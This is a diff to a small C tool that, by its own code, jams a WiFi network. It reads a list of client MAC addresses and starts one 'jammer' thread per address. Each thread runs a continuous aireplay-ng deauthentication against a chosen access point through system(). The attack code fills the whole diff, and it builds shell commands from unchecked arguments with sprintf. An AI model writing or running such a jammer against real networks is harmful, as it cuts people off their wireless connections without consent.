@@ -13,7 +13,7 @@
 
   License     [GPLv2, see LICENSE.md]
   
-  Revision    [beta-03, 2013-11-21]
+  Revision    [beta-04, 2013-12-15]
 
 ******************************************************************************/
 
@@ -27,21 +27,31 @@
 #include <string.h>
 #include <unistd.h>
 #include <errno.h>
+#include <pthread.h>
 
-//general library header
+//Library functions header
 #include "lib.h"
 
-//prototypes
-static char **readFile(char *, int *);
+//Prototypes
+void *jammer();
 
 //error variable
 //xextern int errno;
 
+struct deainfo {
+	maclist_t *maclst;
+	char *bssid;
+	char *mon;
+};
+
+struct deainfo *deathread;
+
 
 int main (int argc, char *argv[])
 {
-	int i, dim;
-	char death[]={"aireplay-ng --deauth 1 -a"}, **maclist, cmd[BUFF];
+	int i, dim, ris, *idx;
+	maclist_t *maclst;
+	pthread_t tid;
 
 	if (argc < 4) {
 		fprintf(stderr, "Argument error. Syntax:\n\t%s [BSSID] [MONITOR-IF] [MAC-LIST-FILE]\n", argv[0]);
@@ -54,53 +64,59 @@ int main (int argc, char *argv[])
     }
 	dim = 0;
 	//reading MACs list
-	if ((maclist = readFile(argv[3], &dim)) == NULL)
+	if ((maclst = freadMaclist(argv[3])) == NULL)
 		return (EXIT_FAILURE);
+	if ((dim = getDim(maclst)) == 0) {
+		fprintf(stderr, "\nError: file empty o wrong content!\n");
+		freeMem(maclst);
+		return (EXIT_FAILURE);
+	}
+	//make data struct
+	if ((deathread = (struct deainfo *)malloc(sizeof(struct deainfo))) == NULL) {
+		fprintf(stderr, "\nError allocating struct: %s\n", strerror(errno));
+		return (EXIT_FAILURE);
+	}
+	deathread->maclst = maclst;
+	deathread->bssid = argv[1];
+	deathread->mon = argv[2];
+	if ((idx = (int *)malloc(dim * sizeof(int))) == NULL) {
+		fprintf(stderr, "\nError allocating index: %s\n", strerror(errno));
+		return (EXIT_FAILURE);
+	}
 
-	while (TRUE) {
-		for (i=0; i<dim; i++) {
-			sprintf(cmd, "%s %s -c %s %s --ignore-negative-one", death, argv[1], maclist[i], argv[2]);
-			fprintf(stdout, "\tDeAuth n.%d:\n", i+1);
-			system(cmd);
+	//creation of threads
+	for (i=0; i<dim; i++) {
+		idx[i] = i;
+		ris = pthread_create(&tid, NULL, jammer, (void *) &idx[i]);
+		if (ris) {
+			fprintf(stderr, "Error creating thread %d (%d): %s\n", i, ris, strerror(errno));
+			return (EXIT_FAILURE);
 		}
 	}
-	freeMem(maclist, dim);
+	pause();
 
-	return (EXIT_SUCCESS);
+    freeMem(maclst);
+	free(deathread);
+	free(idx);
+
+	//return (EXIT_SUCCESS);
+	pthread_exit(NULL);
 }
 
 
-static char **readFile(char *source, int *dim)
+void *jammer(void *idx)
 {
-	FILE *fp;
-	char cmd[BUFF], **maclist;
 	int i;
+	char death[]={"aireplay-ng --deauth 0 -a"}, cmd[BUFF];
 
-	//clear error value
-	errno = 0;
+	i = *(int *)idx;
 
-	//opening file containing MAC list
-	if ((fp = fopen(source, "r")) == NULL) {
-		fprintf(stderr, "Error opening file \"%s\": %s.\n", source, strerror(errno));
-		return NULL;
-	}
-	//checking list lenght
-	while (fgets(cmd, BUFF, fp) != NULL)
-		(*dim)++;
-	rewind(fp);
-	if ((maclist = (char**)malloc((*dim) * sizeof(char*))) == NULL) {
-		fprintf(stderr, "Error allocating MAC list (dim. %d): %s.\n", *dim, strerror(errno));
-		return NULL;
-	}
-	//reading file
-	for (i=0; i<*dim; i++) {
-		fscanf(fp, "%s", cmd);
-		if ((maclist[i] = strdup(cmd)) == NULL) {
-			fprintf(stderr, "Error allocating MAC address (pos. %d): %s.\n", i, strerror(errno));
-			freeMem(maclist, i);
-			return NULL;
-		}
-	}
-	return maclist;
+	sprintf(cmd, "%s %s -c %s %s --ignore-negative-one", death, deathread->bssid, getMac(deathread->maclst, i), deathread->mon);
+	fprintf(stdout, "\tDeAuth n.%d:\n", i+1);
+	setbuf(stdout, NULL);
+
+	system(cmd);
+
+	pthread_exit(NULL);
 }
 
